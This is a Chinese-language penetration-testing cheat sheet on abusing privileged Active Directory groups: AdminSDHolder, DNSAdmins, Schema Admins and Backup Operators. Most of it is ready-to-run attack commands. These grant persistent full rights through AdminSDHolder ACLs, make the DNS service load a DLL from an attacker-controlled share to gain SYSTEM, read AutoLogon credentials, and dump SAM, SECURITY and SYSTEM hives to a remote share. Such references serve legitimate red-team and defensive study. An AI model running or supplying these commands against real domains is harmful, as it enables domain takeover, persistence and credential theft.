# Active Directory - 组

## 危险的内置组用法

如果你不希望修改的 ACL 每小时被覆写，你应该更改对象 `CN=AdminSDHolder,CN=System` 上的 ACL 模板，或将所需对象的 `adminCount` 属性设置为 `0`。

> AdminCount 属性在用户被分配到任何特权组时会自动设置为 `1`，但当用户从这些组中移除时不会自动取消设置。

查找 `AdminCount=1` 的用户。

```ps1
netexec ldap 10.10.10.10 -u username -p password --admin-count
# 或
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName
# 或
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.10.10.10
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
# 或
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
# 或
([adsisearcher]"(AdminCount=1)").findall()
```

## AdminSDHolder 属性

> AdminSDHolder 对象的访问控制列表（ACL）被用作模板，将权限复制到 Active Directory 中所有"受保护组"及其成员。受保护组包括域管理员、管理员、企业管理员和架构管理员等特权组。

如果你修改了 **AdminSDHolder** 的权限，该权限模板将由 `SDProp` 自动推送到所有受保护帐户（在一小时内）。

例如：如果有人试图在一小时或更短时间内将此用户从域管理员中删除，该用户将重新回到组中。

* Windows/Linux：

  ```ps1
  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john

  # 清理
  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
  ```

* 仅 Windows：

  ```ps1
  # 将用户添加到 AdminSDHolder 组：
  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose

  # 使用 titi 帐户重置 toto 的密码权限
  Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword

  # 授予所有权限
  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
  ```

## DNS Admins 组

> DNSAdmins 组的成员可以使用 dns.exe 的权限（SYSTEM）加载任意 DLL。

:warning: 需要重启 DNS 服务的权限。

* 枚举 DNSAdmins 组的成员
    * Windows/Linux：

    ```ps1
    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive
    ```

    * 仅 Windows：

    ```ps1
    Get-NetGroupMember -GroupName "DNSAdmins"
    Get-ADGroupMember -Identity DNSAdmins
    ```

* 更改 DNS 服务加载的 DLL

    ```ps1
    # 使用 RSAT
    dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
    dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

    # 使用 DNSServer 模块
    $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
    $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
    Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
    ```

* 检查前一个命令是否成功

    ```ps1
    Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
    ```

* 重启 DNS

    ```ps1
    sc \\dc01 stop dns
    sc \\dc01 start dns
    ```

## Schema Admins 组

> Schema Admins 组是 Microsoft Active Directory 中的一个安全组，其成员能够对 Active Directory 林的架构进行更改。架构定义了 Active Directory 数据库的结构，包括用于存储用户、组、计算机和目录中其他对象信息的属性和对象类。

## Backup Operators 组

> Backup Operators 组的成员可以备份和还原计算机上的所有文件，无论保护这些文件的权限如何。Backup Operators 还可以登录和关闭计算机。此组不能被重命名、删除或移动。默认情况下，此内置组没有成员，它可以在域控制器上执行备份和还原操作。

此组授予以下权限：

* SeBackup 权限
* SeRestore 权限

获取组成员：

* Windows/Linux：

    ```ps1
    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
    ```

* 仅 Windows：

    ```ps1
    PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
    ```

使用 [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) 启用权限

```ps1
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

获取敏感文件

```ps1
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

获取 `HKLM\SOFTWARE` 注册表中 AutoLogon 的内容

```ps1
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

获取 `SAM`、`SECURITY` 和 `SYSTEM` 注册表

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

    ```ps1
    nxc smb 10.10.10.10 -u user -p password -M backup_operator
    ```

* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

    ```ps1
    .\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\
    ```

* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit)

    ```ps1
    .\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK
    ```

## 参考资料

* [Poc'ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [WHAT'S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
